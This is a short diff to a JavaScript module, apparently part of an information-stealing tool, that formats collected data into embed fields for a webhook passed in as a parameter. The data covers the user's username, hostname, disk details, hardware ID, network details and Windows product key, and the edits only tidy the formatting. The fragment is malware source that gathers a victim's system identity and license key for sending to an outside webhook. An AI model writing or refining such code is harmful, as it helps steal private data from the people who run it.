@@ -32,7 +32,7 @@ module.exports = async (webhookUrl) => {
                     fields: [
                         {
                             name: 'User Information',
-                            value: `\`\`\`Username: ${os.userInfo().username}\nHostname: \`${os.hostname()}\`\`\``,
+                            value: `\`\`\`Username: ${os.userInfo().username}\nHostname: ${os.hostname()}\`\`\``,
                         },
                         {
                             name: 'Disk Information',
@@ -40,7 +40,7 @@ module.exports = async (webhookUrl) => {
                         },
                         {
                             name: 'System Specs',
-                            value: `\`\`\`OS: ${OS}CPU: ${CPU}GPU: ${GPU}RAM: ${RAM}HWID: ${UUID}Product Key: ${WINDOWS_KEY}\`\`\``,
+                            value: `\`\`\`OS: ${OS}\nCPU: ${CPU}\nGPU: ${GPU}\nRAM: ${RAM}\nHWID: ${UUID}\nProduct Key: ${WINDOWS_KEY}\`\`\``,
                         },
                         {
                             name: 'Network Details',
